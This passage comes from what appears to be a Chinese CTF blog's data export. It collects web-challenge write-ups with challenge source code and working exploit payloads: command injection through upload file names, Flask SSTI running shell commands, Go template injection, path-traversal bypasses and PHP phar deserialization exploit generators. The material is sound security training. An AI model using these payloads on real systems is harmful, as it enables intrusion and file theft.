(&#x27;$user&#x27;,&#x27;$pass&#x27;,&#x27;0&#x27;)&quot;; $res = sql_query($sql); return $mysqli-&gt;insert_id;&#125;function logout()&#123; session_destroy(); Header(&quot;Location: index.php&quot;);&#125;?&gt; 一套军体拳下来sql直接被封死，”flag”,”manage”,”ffffllllaaaaggg”,”info”也进入了黑名单，不能直接读取，但我们注意到parse_url()，我们之前也利用了这个函数进行bypass，payload： 1//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg 读取到源码： 1234567&lt;?phpif (FLAG_SIG != 1)&#123; die(&quot;you can not visit it directly&quot;);&#125;else &#123; echo &quot;you can find sth in m4aaannngggeee&quot;;&#125;?&gt; 继续读取m4aaannngggeee： 1234567&lt;?phpif (FLAG_SIG != 1)&#123; die(&quot;you can not visit it directly&quot;);&#125;include &quot;templates/upload.html&quot;;?&gt; 访问templates/upload.html上传文件，结果怎么传都是404，但是通过url我们发现存在upllloadddd.php，继续读取： 1234567891011121314151617181920212223242526&lt;?php$allowtype = array(&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;);$size = 10000000;$path = &quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;;$filename = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;];if(is_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]))&#123; if(!move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;],$path.$filename))&#123; die(&quot;error:can not move&quot;); &#125;&#125;else&#123; die(&quot;error:not an upload file！&quot;);&#125;$newfile = $path.$filename;echo &quot;file upload success&lt;br /&gt;&quot;;echo $filename;$picdata = system(&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;.$filename.&quot; | base64 -w 0&quot;);echo &quot;&lt;img src=&#x27;data:image/png;base64,&quot;.$picdata.&quot;&#x27;&gt;&lt;/img&gt;&quot;;if($_FILES[&#x27;file&#x27;][&#x27;error&#x27;]&gt;0)&#123; unlink($newfile); die(&quot;Upload file error: &quot;);&#125;$ext = array_pop(explode(&quot;.&quot;,$_FILES[&#x27;file&#x27;][&#x27;name&#x27;]));if(!in_array($ext,$allowtype))&#123; unlink($newfile);&#125;?&gt; 核心代码在$picdata = system(&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;.$filename.&quot; | base64 -w 0&quot;);，我们要利用这里进行rce，找了半天上传点，最后发现在user.php?page=m4aaannngggeee。 上传文件，更改文件名为;ls;#，查看当前目录下的文件，没发现flag，因此去根目录找，斜杠被屏蔽用cd代替： 12filename=&quot;;cd ..;ls;#&quot;filename=&quot;;cd ..;cat flag_233333;#&quot; 得到flag。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"NSSCTF练习3","slug":"NSSCTF练习3","date":"2022-04-08T06:08:30.000Z","updated":"2022-04-09T10:09:45.835Z","comments":true,"path":"2022/04/08/NSSCTF练习3/","link":"","permalink":"http://example.com/2022/04/08/NSSCTF%E7%BB%83%E4%B9%A03/","excerpt":"前言继续刷NSSCTF上的题。","text":"前言继续刷NSSCTF上的题。 [SCTF 2021]loginme下载附件，发现是go语言编写的网页，虽然没学过go，但是关键代码部分还是能审的。 同时进入网页，提示我们非本地不能登录，但是测试发现不能用xff绕过，因此我们找到对应代码middleware.go： 1234567891011121314151617181920package middlewareimport ( &quot;github.com/gin-gonic/gin&quot;)func LocalRequired() gin.HandlerFunc &#123; return func(c *gin.Context) &#123; if c.GetHeader(&quot;x-forwarded-for&quot;) != &quot;&quot; || c.GetHeader(&quot;x-client-ip&quot;) != &quot;&quot; &#123; c.AbortWithStatus(403) return &#125; ip := c.ClientIP() if ip == &quot;127.0.0.1&quot; &#123; c.Next() &#125; else &#123; c.AbortWithStatus(401) &#125; &#125;&#125; 显然xff和cip都被禁用了，使用就会跳转至403页面，因此这里要使用x-real-ip绕过。 接着我们发现之后的页面回显了一些信息，根据url中id值的不同回显内容也不同，那么我们审查下这一部分的代码，structs.go： 123456789101112131415161718192021222324252627282930313233343536package structstype UserInfo struct &#123; Id int Username string Age string Password string&#125;var Users = []UserInfo&#123; &#123; Id: 1, Username: &quot;Grandpa Lu&quot;, Age: &quot;22&quot;, Password: &quot;hack you!&quot;, &#125;, &#123; Id: 2, Username: &quot;Longlone&quot;, Age: &quot;??&quot;, Password: &quot;i don&#x27;t know&quot;, &#125;, &#123; Id: 3, Username: &quot;Teacher Ma&quot;, Age: &quot;20&quot;, Password: &quot;guess&quot;, &#125;,&#125;var Admin = UserInfo&#123; Id: 0, Username: &quot;Admin&quot;, Age: &quot;&quot;, Password: &quot;flag&#123;&#125;&quot;,&#125; 我们发现admin的密码就是flag，而age是空的，但是在返回时我们发现admin的age有返回，因此我们跟进age的返回，查看代码route.php： 12345678age := TargetUser.Ageif age == &quot;&quot; &#123; age, flag = c.GetQuery(&quot;age&quot;) if !flag &#123; age = &quot;forever 18 (Tell me the age)&quot; &#125;&#125;html := fmt.Sprintf(templates.AdminIndexTemplateHtml, age) 由于年龄是空所以返回了对应的值，而打印年龄的代码是格式化字符串并赋值给新串。继续往下看发现还有模板渲染语句： 1tmpl, err := template.New(&quot;admin_index&quot;).Parse(html) go语言模板渲染支持传入一个结构体的实例来渲染它的字段，就有可能造成信息泄露。而在go语言中使用的是&#123;&#123;.name&#125;&#125;代表要应用的对象，所以可以让age=&#123;&#123;.Password&#125;&#125;。 payload： 12?id=0&amp;age=&#123;&#123;.Password&#125;&#125;X-Real-IP: 127.0.0.1 [GKCTF 2021]easycms也开始做一些cms的题目了。首先目录扫描扫出admin.php，进入登录，提示5位弱口令，测试出来是12345。进入后台后，寻找能够利用的利用点，比如文件上传、页面更改等等。 我们在设计-主题的菜单中发现可以更改网页设置，并且在类型选择中可以选择php源代码，因此我们在首页编辑的幻灯片中更改内容为php源代码。但是保存时发现验证管理员权限： 1请在服务器创建 /var/www/html/system/tmp/vhpg.txt 文件，如果存在该文件，使用编辑软件打开，重新保存一遍。 那么我们需要寻找文件上传点，我们在设计-组件-素材库中发现上传点，上传一个txt后根据目录来重命名文件： 1../../../../../system/tmp/vhpg 路径确认更改后，回到之前的页面更改布局为php源代码，直接rce，回到前台，原来幻灯片的位置已经变成了flag。 [HCTF 2018]Warmup进入网页看到一个滑稽，审查元素发现提示source.php。 审计代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 &lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; 一眼看过去以为是反序列化，但是有没看到反序列化的函数。因此首先看class外的部分，一个文件包含，最重要的是有做调用。那么我们顺势康康class内部。 我们发现白名单只允许读取source.php和hint.php，传入hint.php读取： 1flag not here, and flag in ffffllllaaaagggg 好，我们知道了flag藏在哪里了，但是我们没法直接读取，因此继续往下看： 1234$_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) 我们可以好好研究下这段代码，mb_strpos()的作用是返回第二个参数在第一个参数中首次出现的位置，因此正常情况下这里返回的应该是最后一个位置，即-1。 接下来是mb_strpos()，这个函数有三个参数，第一个参数是操作字符串，第二个参数是操作起始位置，第三个参数是操作字符长度。因此这里本应该读取$page的全部内容，即file的内容。 但是如果我们在file中加入?，那么就能造成截断。这个时候page将会验证?前方的str是否包含在array中，因此就能实现checkFile函数的绕过。 我们发现原函数进行了一次url解码，因此我们进行两次url编码，这样得到的%253f会在第二次decode后于最后一个in_array验证被截断并返回true。最后利用/读取flag，payload： 1?file=hint.php%253f/../../../../ffffllllaaaagggg [NCTF 2018]全球最大交友网站这题是个比较特殊的git源码泄露，跟之前的有点不一样，感觉挺有意思的就记录一下。 首先是NSS环境的问题导致题目有点问题，访问/.git时不会跳403而是直接到目录了，不过问题不大，因为这样我们也没法获取flag。 我们常用的GitHack工具会直接把.git恢复到文件已经完成了，然后还把.git文件夹删了，也就自动恢复成了最新版本。因此我们要使用lijiejie的GitHack工具。 这题的思路和p牛15年的一篇文章其中的一些内容是一样的，先贴一下：XDCTF2015代码审计全解 1python GitHack.py http://1.14.71.254:28583/.git/ 下载后发现README.md： 1Allsource files areingit tag1.0 说明flag在历史版本中，由于原理法实在难啃，我们就直接用工具啃，直接上scarbble： 1./scrabble http://1.14.71.254:28583 通过git log查看历史： 把head轮流指向这些文件，找到真正的flag藏在hello中： 1git show HEAD 01b878ee5f39810a02f06b4a560571413020ea42 [CISCN 2019华东南]Double Secret进入网页，啥都没有，只有一行提示： 1Welcome To Find Secret 这个意思比较抽象，其实是指向secret路由，进入后又有一行提示： 1Tell me your secret.I will encrypt it so others can&#x27;t see 这比上一个来说还是好一点的，意思就是传参一个secret，那么我们应该传参啥，无非就试试sql、ssti这几个比较常用的。 经测试是ssti，我们输入&#123;&#123;2+2&#125;&#125;时出现了报错，告诉我们模板是flask，python2.7，使用RC4加密算法，密钥为HereIsTreasure。 因此我们使用rc4加密的exp对payload进行加密： 12345678910111213141516171819202122232425262728293031import base64from urllib.parse import quotedef rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;): # print(&quot;RC4加密主函数&quot;) s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return cryptdef rc4_init_sbox(key): s_box = list(range(256)) # print(&quot;原来的 s 盒：%s&quot; % s_box) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] # print(&quot;混乱后的 s 盒：%s&quot;% s_box) return s_boxdef rc4_excrypt(plain, box): # print(&quot;调用加密程序成功。&quot;) res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) cipher = &quot;&quot;.join(res) print(&quot;%s&quot; %quote(cipher)) return (str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;lipsum.__globals__.__builtins__.eval(\\&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag.txt&#x27;).read()\\&quot;)&#125;&#125;&quot;) payload: 1/secret?secret=.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92 传参获取flag。 [AFCTF 2021]search这题还是比较简单的，首先信息搜集发现www.zip，获取源码search.php： 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);$argv = $_GET[&quot;search&quot;];for ($i = 0; $i &lt; strlen($argv); $i++) &#123; if (($argv[$i] == &#x27;&amp;&#x27;) || ($argv[$i] == &#x27;&gt;&#x27;) || ($argv[$i] == &#x27;&lt;&#x27;) || ($argv[$i] == &#x27;(&#x27;) || ($argv[$i] == &#x27;;&#x27;) || ($argv[$i] == &#x27;|&#x27;) ) &#123; if ($i == 0) &#123; goto error; &#125; if (($i == 1) &amp;&amp; ($argv[0] == &#x27;\\\\&#x27;)) &#123; continue; &#125; if (($argv[$i - 1] == &#x27;\\\\&#x27;) &amp;&amp; ($argv[$i - 2] != &#x27;\\\\&#x27;)) &#123; continue; &#125; error: exit(&quot;Input contains prohibited characters!&lt;br&gt;&quot;); &#125;&#125;echo &quot;&lt;h3&gt;Search reslut:&lt;/h3&gt;&lt;br&gt;&quot;;system(&quot;find / -iname &quot; . $argv);?&gt; 非常直观，实行find命令，发现flag在根目录下，这里我们只需要利用-exec执行命令就可以了，payload: 1/search.php?search=flag -exec cat &#123;&#125; \\;","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-write up -ctf -web","slug":"write-up-ctf-web","permalink":"http://example.com/tags/write-up-ctf-web/"}]},{"title":"pop链专练1","slug":"pop链专练1","date":"2022-04-07T05:47:08.000Z","updated":"2022-04-07T12:48:28.351Z","comments":true,"path":"2022/04/07/pop链专练1/","link":"","permalink":"http://example.com/2022/04/07/pop%E9%93%BE%E4%B8%93%E7%BB%831/","excerpt":"前言说恶补pop就要恶补pop，基础知识已经基本全部过了一遍了，接下来主要就是练题了。","text":"前言说恶补pop就要恶补pop，基础知识已经基本全部过了一遍了，接下来主要就是练题了。 [SWPUCTF 2021 新生赛]pop入门pop题，查看源码： 123456789101112131415161718192021222324252627282930313233343536373839404142 &lt;?phperror_reporting(0);show_source(&quot;index.php&quot;);class w44m&#123; private $admin = &#x27;aaa&#x27;; protected $passwd = &#x27;123456&#x27;; public function Getflag()&#123; if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123; include(&#x27;flag.php&#x27;); echo $flag; &#125;else&#123; echo $this-&gt;admin; echo $this-&gt;passwd; echo &#x27;nono&#x27;; &#125; &#125;&#125;class w22m&#123; public $w00m; public function __destruct()&#123; echo $this-&gt;w00m; &#125;&#125;class w33m&#123; public $w00m; public $w22m; public function __toString()&#123; $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;(); return 0; &#125;&#125;$w00m = $_GET[&#x27;w00m&#x27;];unserialize($w00m);?&gt; 链子的构建还是很明显的，主要是出入口都太明确了，直接构造exp： 123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(0);show_source(&quot;index.php&quot;);class w44m&#123; private $admin = &#x27;w44m&#x27;; protected $passwd = &#x27;08067&#x27;;&#125;class w22m&#123; public $w00m; public function __construct()&#123; $this-&gt;w00m=new w33m(); &#125;&#125;class w33m&#123; public $w00m; public $w22m = &quot;Getflag&quot;; public function __construct()&#123; $this-&gt;w00m=new w44m(); return 0; &#125;&#125;$a=new w22m();echo urlencode(serialize($a));?&gt; [CISCN2019 华北赛区 Day1 Web1]Dropbox质量很高的一题，同时结合了phar反序列化的考点。首先进入网页，发现要登录，那么注册登录。 登陆后发现存在文件上传，但是发现对后缀进行白名单，因此upload漏洞被堵了，接着发现上传后可以进行文件下载，并且对filename没有进行限制及编码，猜测存在任意文件下载、，接下来我们开始下载文件： index.php 1234567891011121314151617&lt;?phpsession_start();if (!isset($_SESSION[&#x27;login&#x27;])) &#123; header(&quot;Location: login.php&quot;); die();&#125;?&gt;HTML省略&lt;?phpinclude &quot;class.php&quot;;$a = new FileList($_SESSION[&#x27;sandbox&#x27;]);$a-&gt;Name();$a-&gt;Size();?&gt; class.php： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144&lt;?phperror_reporting(0);$dbaddr = &quot;127.0.0.1&quot;;$dbuser = &quot;root&quot;;$dbpass = &quot;root&quot;;$dbname = &quot;dropbox&quot;;$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; public function user_exist($username) &#123; $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) &#123; return false; &#125; return true; &#125; public function add_user($username, $password) &#123; if ($this-&gt;user_exist($username)) &#123; return false; &#125; $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;); $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password); $stmt-&gt;execute(); return true; &#125; public function verify_user($username, $password) &#123; if (!$this-&gt;user_exist($username)) &#123; return false; &#125; $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) &#123; return true; &#125; return false; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125;&#125;class FileList &#123; private $files; private $results; private $funcs; public function __construct($path) &#123; $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(&quot;.&quot;, $filenames); unset($filenames[$key]); $key = array_search(&quot;..&quot;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) &#123; $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); &#125; &#125; public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125; &#125; public function __destruct() &#123; $table = &#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;; $table .= &#x27;&lt;thead&gt;&lt;tr&gt;&#x27;; foreach ($this-&gt;funcs as $func) &#123; $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27; . htmlentities($func) . &#x27;&lt;/th&gt;&#x27;; &#125; $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;; $table .= &#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;; foreach ($this-&gt;results as $filename =&gt; $result) &#123; $table .= &#x27;&lt;tr&gt;&#x27;; foreach ($result as $func =&gt; $value) &#123; $table .= &#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27; . htmlentities($value) . &#x27;&lt;/td&gt;&#x27;; &#125; $table .= &#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27; . htmlentities($filename) . &#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;; $table .= &#x27;&lt;/tr&gt;&#x27;; &#125; echo $table; &#125;&#125;class File &#123; public $filename; public function open($filename) &#123; $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function name() &#123; return basename($this-&gt;filename); &#125; public function size() &#123; $size = filesize($this-&gt;filename); $units = array(&#x27; B&#x27;, &#x27; KB&#x27;, &#x27; MB&#x27;, &#x27; GB&#x27;, &#x27; TB&#x27;); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; &#125; public function detele() &#123; unlink($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125;?&gt; delete.php： 123456789101112131415161718192021222324252627&lt;?phpsession_start();if (!isset($_SESSION[&#x27;login&#x27;])) &#123; header(&quot;Location: login.php&quot;); die();&#125;if (!isset($_POST[&#x27;filename&#x27;])) &#123; die();&#125;include &quot;class.php&quot;;chdir($_SESSION[&#x27;sandbox&#x27;]);$file = new File();$filename = (string) $_POST[&#x27;filename&#x27;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123; $file-&gt;detele(); Header(&quot;Content-type: application/json&quot;); $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;); echo json_encode($response);&#125; else &#123; Header(&quot;Content-type: application/json&quot;); $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;); echo json_encode($response);&#125;?&gt; 其他代码没有实际作用再次不放出了。class.php发现和数据库交互的语句全部进行了参数绑定，因此不存在sql。 首先看出口，File类的close()中存在file_get_contents，拿来做出口在适合不过。接着发现User类中的__destruct()调用了close()，很有可能要通过这里进行打印。而FileList类中有__call()可以进行调用，那么我们就将$this-&gt;db复制为FileList类这样我们就可以直接使用该类中得方法。 而这个__call()几乎明示我们这里要用到phar反序列化了，因此构建exp： 123456789101112131415161718192021222324252627282930313233343536&lt;?phpclass User&#123; public $db; public function __construct() &#123; $this-&gt;db = new FileList(); &#125;&#125;class File&#123; public $filename;&#125;class FileList &#123; private $files; public function __construct() &#123; $file = new File(); $file-&gt;filename = &#x27;/flag.txt&#x27;; $this-&gt;files = array($file); &#125;&#125;$User = new User();$phar = new Phar(&quot;./phar.phar&quot;); $phar-&gt;startBuffering();$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;);$phar-&gt;setMetadata($User);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering();?&gt; 将生成的phar文件后缀改成jpg，然后上传，最后利用phar://伪协议删除文件触发反序列化，读取flag。 [SWPUCTF 2018]SimplePHP和上一题比较类似，首先是任意文件读取漏洞获取源码，我们读取关键代码。 class.php： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879 &lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; &#125; public function __toString() &#123; $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match(&#x27;/http|https|file:|gopher|dict|\\.\\.|f1ag/i&#x27;,$this-&gt;source)) &#123; die(&#x27;hacker!&#x27;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = &quot;index.php&quot;; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125;?&gt; 这次多了几个waf，不过我们依然要先定位出入口。出口很好定位，Test类的file_get()，存在base64_encode(file_get_contents($value))，可以读取文件。那么为了触发这个函数，我们定位到同类下的__get()，利用其到get()来触发。 那么我们发现Show类的__toString()中可以把$content的内容返回对象，而若$show-&gt;str[‘str’]为test类的一个实例化对象，则因test类里面没有source属性，从而触发__get()方法。 最后定位到Cle4r类，__destruct()方法可以把$test也就是$str给输出出来。将$str声明为$show对象可以触发show类中的__toString()方法。 链条构造完成，编写exp： 12345678910111213141516171819202122232425262728293031&lt;?phpclass C1e4r&#123; public $test; public $str;&#125;class Show&#123; public $source; public $str;&#125;class Test&#123; public $file; public $params;&#125;$c1e4r = new C1e4r();$show = new Show();$test = new Test();$test-&gt;params[&#x27;source&#x27;] = &quot;/var/www/html/f1ag.php&quot;;$c1e4r-&gt;str = $show; $show-&gt;str[&#x27;str&#x27;] = $test; $phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;); $phar-&gt;setMetadata($c1e4r); $phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering();?&gt; 上传后在/upload目录下获取文件名，最后在查看文件的目录下用phar://伪协议读取flag。 [第五空间 2021]pklovecloud审计源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960 &lt;?php include &#x27;flag.php&#x27;;class pkshow &#123; function echo_name() &#123; return &quot;Pk very safe^.^&quot;; &#125; &#125; class acp &#123; protected $cinder; public $neutron; public $nova; function __construct() &#123; $this-&gt;cinder = new pkshow; &#125; function __toString() &#123; if (isset($this-&gt;cinder)) return $this-&gt;cinder-&gt;echo_name(); &#125; &#125; class ace&#123; public $filename; public $openstack; public $docker; function echo_name() &#123; $this-&gt;openstack = unserialize($this-&gt;docker); $this-&gt;openstack-&gt;neutron = $heat; if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova) &#123; $file = &quot;./&#123;$this-&gt;filename&#125;&quot;; if (file_get_contents($file)) &#123; return file_get_contents($file); &#125; else &#123; return &quot;keystone lost~&quot;; &#125; &#125; &#125; &#125; if (isset($_GET[&#x27;pks&#x27;])) &#123; $logData = unserialize($_GET[&#x27;pks&#x27;]); echo $logData; &#125; else &#123; highlight_file(__file__); &#125;?&gt; 前面两题做的真的头大，返回来看题简单的。首先pkshow类一看就没用，因此这个pop只用到了两个类。出口显然是ace类的echo_name()，为了触发这个函数，我们发现acp类中的__toString()调用了这个函数，因此我们要想办法调用。acp实例化时会自动调用__construct()，所以要想触发__toString()就要使$this-&gt;cinder=对象，正好与上述分析所需的 $this-&gt;cinder = new ace() 相呼应。 因此链条梳理完成，但是我们要注意到在echo_name()中有这样几行： 123$this-&gt;openstack = unserialize($this-&gt;docker);$this-&gt;openstack-&gt;neutron = $heat;if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova) 这里有个非预期，直接空等于空就可以绕过了，exp： 123456789101112131415161718192021&lt;?phpclass acp &#123; protected $cinder; public $neutron; public $nova; function __construct() &#123; $this-&gt;cinder = new ace(); &#125;&#125; class ace&#123; public $filename=&quot;flag.php&quot;; public $openstack; public $docker=&#x27;&#x27;; &#125; $a=new acp();echo urlencode(serialize($a)); 那么预期解是怎样的呢，官方wp中将原来为空的docker的值改为O:8:&quot;stdClass&quot;:2:&#123;s:7:&quot;neutron&quot;;s:1:&quot;a&quot;;s:4:&quot;nova&quot;;R:2;&#125;即可。 这个反序列化，尤其是这个R真把我搞迷糊了，这个的原理可以参考下面这篇文章，做出了一定的解释：2021第五空间CTF pklovecloud 不过经过测试发现，其实直接令neutron和nova的值相等就可以了，好像是由于$cinder变量的属性是protected，导致其实$this-&gt;openstack-&gt;neutron = $heat;这句话可以被覆盖，具体原理可能得等之后再探究了。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -php","slug":"web-php","permalink":"http://example.com/tags/web-php/"}]},{"title":"php迭代器（原生类）的利用","slug":"php迭代器（原生类）的利用","date":"2022-04-04T05:55:45.000Z","updated":"2022-04-06T02:52:17.999Z","comments":true,"path":"2022/04/04/php迭代器（原生类）的利用/","link":"","permalink":"http://example.com/2022/04/04/php%E8%BF%AD%E4%BB%A3%E5%99%A8%EF%BC%88%E5%8E%9F%E7%94%9F%E7%B1%BB%EF%BC%89%E7%9A%84%E5%88%A9%E7%94%A8/","excerpt":"前言填坑这一块知识了，填完坑就要开始恶补pop和xss这两块的知识来为iscc做准备了。","text":"前言填坑这一块知识了，填完坑就要开始恶补pop和xss这两块的知识来为iscc做准备了。 php原生类在CTF题目中，php原生类的运用主要可以利用在xss、反序列化、ssrf、xxe以及读取文件的解题上。 我们可以通过下面这个exp来遍历原生类： 123456789101112131415 &lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123; $methods = get_class_methods($class); foreach ($methods as $method) &#123; if (in_array($method, array( &#x27;__destruct&#x27;, &#x27;__toString&#x27;, &#x27;__wakeup&#x27; // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类 ))) &#123; print $class . &#x27;::&#x27; . $method . &quot;\\n&quot;; &#125; &#125;&#125; 接下来我们学习认识应用比较常用的一些原生类。 Error/Exceptionxss的利用在报错开启的情况下，php7中利用Error类可能会导致xss漏洞，因为它内置一个__toString()方法。如果做pop时打不通了可能就可以尝试直接一转xss。 test.php： 12345&lt;?php$a = unserialize($_GET[&#x27;cmd&#x27;]);echo $a;highlight_file(__FILE__);?&gt; poc： 12345&lt;?php$a = new 